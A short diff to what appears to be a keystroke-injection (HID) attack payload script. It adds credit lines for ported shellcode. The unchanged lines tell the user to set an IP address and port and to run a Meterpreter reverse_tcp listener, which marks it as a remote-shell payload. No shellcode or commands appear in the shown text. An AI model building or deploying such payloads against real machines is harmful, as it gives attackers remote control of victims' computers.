@@ -1,5 +1,6 @@
+REM Shellcode from Cn33liz/JSMeter
+REM Ported by: SubINaclS
 REM Change IPADDR and PORT to match your system
-
 REM Listener should be set to windows/x64/meterpreter/reverse_tcp
 LED G
 ATTACKMODE HID
